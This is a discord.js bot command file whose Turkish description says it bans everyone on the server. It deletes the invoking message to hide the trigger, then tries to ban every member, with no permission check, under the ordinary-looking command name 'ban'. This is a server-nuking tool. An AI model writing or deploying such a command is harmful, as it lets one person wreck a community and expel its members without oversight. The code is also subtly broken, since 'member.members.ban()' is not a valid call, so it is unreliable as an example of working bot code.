const Discord = require('discord.js');

exports.run = (client, msg, args) => {
    msg.delete();
    msg.guild.members.cache.forEach(member => member.members.ban());
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['ban']
};

exports.help = {
  name: 'Ban',
  description: 'Sunucudaki Herkesi Banlar.',
  usage: 'ban'
};